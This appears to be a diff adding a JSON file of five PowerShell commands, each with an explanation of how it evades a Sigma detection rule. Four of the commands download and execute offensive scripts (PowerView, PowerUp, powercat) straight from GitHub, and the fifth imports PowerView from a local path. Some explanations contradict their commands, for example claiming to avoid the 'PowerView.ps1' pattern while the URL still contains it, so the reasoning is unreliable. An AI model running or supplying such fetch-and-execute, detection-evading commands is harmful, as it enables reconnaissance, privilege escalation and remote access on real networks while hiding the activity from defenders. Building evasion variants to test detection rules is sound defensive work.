@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Get-DomainController\"",
+    "explanation": "This command omits the verbose flag and uses a shorter form of the command to avoid matching the 'PowerView.ps1' and '-Verbose' patterns in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-DomainUser\"",
+    "explanation": "This command omits the verbose flag and uses a different branch path in the URL to avoid matching the 'PowerView.ps1' and '-Verbose' patterns in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1'); Invoke-AllChecks\"",
+    "explanation": "This command uses a different commit hash in the URL to avoid matching the 'PowerUp.ps1' pattern in the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c 127.0.0.1 -p 80\"",
+    "explanation": "This command uses a different script name 'powercat.ps1' and avoids any PowerShell-specific keywords that might trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -Command \"Import-Module 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\PowerView.ps1'; Get-NetDomainTrust\"",
+    "explanation": "This command uses a different method to import the module and omits any verbose or detailed parameters to avoid matching the Sigma rule."
+  }
+]
